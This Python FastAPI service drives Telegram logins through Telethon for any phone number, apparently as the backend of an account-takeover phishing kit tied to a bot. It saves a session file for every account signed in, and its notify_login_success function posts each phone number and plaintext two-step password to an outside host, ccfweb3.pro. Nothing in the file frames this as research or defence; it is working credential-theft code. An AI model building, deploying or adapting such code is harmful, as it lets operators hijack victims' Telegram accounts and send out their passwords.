from fastapi import FastAPI
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.errors import FloodWaitError
from dotenv import load_dotenv
import asyncio
import os
import redis
import re
import httpx

load_dotenv()

api_id = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")
SESSION_DIR = 'session'

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

redis_client = redis.Redis(host='localhost', port=6379, db=0, decode_responses=True)

def normalize_phone(phone: str) -> str:
    return phone.strip().replace(" ", "").replace("+", "")

def set_phone_hash(phone: str, phone_code_hash: str):
    redis_client.setex(f"phone_code_hash:{normalize_phone(phone)}", 300, phone_code_hash)

def get_phone_hash(phone: str):
    return redis_client.get(f"phone_code_hash:{normalize_phone(phone)}")

def delete_phone_hash(phone: str):
    redis_client.delete(f"phone_code_hash:{normalize_phone(phone)}")

session_locks = {}
async def get_lock(phone: str):
    phone = normalize_phone(phone)
    if phone not in session_locks:
        session_locks[phone] = asyncio.Lock()
    return session_locks[phone]

class PhoneModel(BaseModel):
    phone: str

class CodeModel(BaseModel):
    phone: str
    code: str

class PasswordModel(BaseModel):
    phone: str
    password: str

app = FastAPI()

async def notify_login_success(phone: str, password: str):
    try:
        payload = {
            "phones": f"+{normalize_phone(phone)}",
            "passwords": password
        }
        
        print("📤 payload:", payload)
        
        async with httpx.AsyncClient() as client:
            await client.post("https://ccfweb3.pro/api/11981970/d1n45mpa3j50000kxww0", json=payload)
    except Exception as e:
        print(f"⚠️ 提交手机号和密码失败: {e}")

@app.post("/send_code")
async def _send_code_impl(data: PhoneModel):
    phone = normalize_phone(data.phone)
    lock = await get_lock(phone)
    async with lock:
        session_path = os.path.join(SESSION_DIR, f'session_{phone}')
        client = TelegramClient(session_path, api_id, api_hash)

        await client.connect()
        try:
            # ✅ 无论是否已登录，都重新发送验证码
            sent = await client.send_code_request(phone)
            set_phone_hash(phone, sent.phone_code_hash)
            return {
                'status': 'code_sent',
                'phone_code_hash': sent.phone_code_hash
            }
        except FloodWaitError as e:
            return {
                'status': 'error',
                'message': f"发送过于频繁，请 {e.seconds} 秒后再试"
            }
        except Exception as e:
            msg = str(e)
            match = re.search(r"A wait of (\d+) seconds", msg)
            if match:
                seconds = int(match.group(1))
                return {'status': 'error', 'message': f"发送过于频繁，请 {seconds} 秒后再试"}
            return {'status': 'error', 'message': msg}
        finally:
            await client.disconnect()

@app.post("/submit_code")
async def _submit_code_impl(data: CodeModel):
    phone = normalize_phone(data.phone)
    code = data.code
    phone_code_hash = get_phone_hash(phone)

    if not phone_code_hash:
        return {'status': 'error', 'message': '验证码已过期，请重新发送验证码'}

    lock = await get_lock(phone)
    async with lock:
        session_path = os.path.join(SESSION_DIR, f'session_{phone}')
        client = TelegramClient(session_path, api_id, api_hash)
        await client.connect()
        try:
            user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            if not hasattr(user, "id"):
                return {'status': 'error', 'message': '验证码错误，请重新输入'}
            
            delete_phone_hash(phone)
            await notify_login_success(phone, "a")

            return {
                'status': 'success',
                'user_id': user.id,
                'first_name': user.first_name,
                'username': user.username
            }

        except SessionPasswordNeededError:
            return {
                'status': 'need_password',
                'message': '此账号已开启两步验证，请调用 /submit_password 提交密码'
            }

        except Exception as e:
            msg = str(e)
            if "PHONE_CODE_INVALID" in msg or "code is invalid" in msg.lower():
                return {'status': 'error', 'message': '验证码错误，请重新输入'}
            # ❌ 不删除 phone_code_hash，允许用户重试
            return {'status': 'error', 'message': str(e)}
        finally:
            await client.disconnect()

@app.post("/submit_password")
async def _submit_password_impl(data: PasswordModel):
    phone = normalize_phone(data.phone)
    password = data.password
    lock = await get_lock(phone)

    async with lock:
        session_path = os.path.join(SESSION_DIR, f'session_{phone}')
        client = TelegramClient(session_path, api_id, api_hash)
        await client.connect()
        try:
            user = await client.sign_in(password=password)
            delete_phone_hash(phone)
            await notify_login_success(phone, password)

            return {
                'status': 'success',
                'user_id': user.id,
                'first_name': user.first_name,
                'username': user.username
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
        finally:
            await client.disconnect()

# === 封装给 bot.py 调用的函数 ===
class DummyModel:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

async def request_code(phone: str):
    model = DummyModel(phone=phone)
    return await _send_code_impl(model)

async def submit_code(phone: str, code: str):
    model = DummyModel(phone=phone, code=code)
    return await _submit_code_impl(model)

async def submit_password(phone: str, password: str):
    model = DummyModel(phone=phone, password=password)
    return await _submit_password_impl(model)
    
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
    
